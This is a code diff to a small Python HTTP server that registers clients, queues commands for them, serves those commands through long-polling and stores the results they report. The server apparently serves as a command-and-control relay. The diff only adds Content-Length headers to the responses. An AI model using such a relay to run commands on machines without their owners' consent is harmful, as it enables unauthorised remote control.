@@ -65,13 +65,17 @@ class Handler(BaseHTTPRequestHandler):
                 clients.add(client_id)
                 client_queues.setdefault(client_id, queue.Queue())
                 client_results.setdefault(client_id, '')
+                body = b'Registered'
                 self.send_response(200)
+                self.send_header('Content-Length', str(len(body)))
                 self.end_headers()
-                self.wfile.write(b'Registered')
+                self.wfile.write(body)
             else:
+                body = b'Bad Request'
                 self.send_response(400)
+                self.send_header('Content-Length', str(len(body)))
                 self.end_headers()
-                self.wfile.write(b'Bad Request')
+                self.wfile.write(body)
         elif self.path == '/send':
             try:
                 payload = json.loads(data.decode())
@@ -79,15 +83,19 @@ class Handler(BaseHTTPRequestHandler):
                 cmd = payload.get('command')
                 if cid in clients and cmd:
                     client_queues[cid].put(cmd)
+                    body = b'Command queued'
                     self.send_response(200)
+                    self.send_header('Content-Length', str(len(body)))
                     self.end_headers()
-                    self.wfile.write(b'Command queued')
+                    self.wfile.write(body)
                     return
             except Exception:
                 pass
+            body = b'Bad Request'
             self.send_response(400)
+            self.send_header('Content-Length', str(len(body)))
             self.end_headers()
-            self.wfile.write(b'Bad Request')
+            self.wfile.write(body)
         elif self.path == '/result':
             try:
                 payload = json.loads(data.decode())
@@ -95,15 +103,19 @@ class Handler(BaseHTTPRequestHandler):
                 res = payload.get('result')
                 if cid in clients:
                     client_results[cid] = res
+                    body = b'Result stored'
                     self.send_response(200)
+                    self.send_header('Content-Length', str(len(body)))
                     self.end_headers()
-                    self.wfile.write(b'Result stored')
+                    self.wfile.write(body)
                     return
             except Exception:
                 pass
+            body = b'Bad Request'
             self.send_response(400)
+            self.send_header('Content-Length', str(len(body)))
             self.end_headers()
-            self.wfile.write(b'Bad Request')
+            self.wfile.write(body)
         else:
             self.send_response(404)
             self.end_headers()
@@ -111,10 +123,13 @@ class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         parsed = urlparse(self.path)
         if parsed.path == '/clients':
+            body = json.dumps(sorted(list(clients))).encode()
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
+            self.send_header('Content-Length', str(len(body)))
             self.end_headers()
-            self.wfile.write(json.dumps(sorted(list(clients))).encode())
+            self.wfile.write(body)
+
         elif parsed.path == '/poll':
             qs = parse_qs(parsed.query)
             cid = qs.get('client_id', [None])[0]
@@ -123,31 +138,40 @@ class Handler(BaseHTTPRequestHandler):
                     cmd = client_queues[cid].get(timeout=30)
                 except queue.Empty:
                     cmd = None
+                body = json.dumps({'command': cmd}).encode()
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/json')
+                self.send_header('Content-Length', str(len(body)))
                 self.end_headers()
-                self.wfile.write(json.dumps({'command': cmd}).encode())
+                self.wfile.write(body)
             else:
                 self.send_response(404)
+                self.send_header('Content-Length', '0')
                 self.end_headers()
         elif parsed.path == '/result':
             qs = parse_qs(parsed.query)
             cid = qs.get('client_id', [None])[0]
             if cid in clients:
+                body = json.dumps({'result': client_results.get(cid, '')}).encode()
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/json')
+                self.send_header('Content-Length', str(len(body)))
                 self.end_headers()
-                self.wfile.write(json.dumps({'result': client_results.get(cid, '')}).encode())
+                self.wfile.write(body)
             else:
                 self.send_response(404)
+                self.send_header('Content-Length', '0')
                 self.end_headers()
         elif parsed.path == '/':
+            body = INDEX_PAGE.encode()
             self.send_response(200)
             self.send_header('Content-Type', 'text/html')
+            self.send_header('Content-Length', str(len(body)))
             self.end_headers()
-            self.wfile.write(INDEX_PAGE.encode())
+            self.wfile.write(body)
         else:
             self.send_response(404)
+            self.send_header('Content-Length', '0')
             self.end_headers()
 
 def run(port=8000):
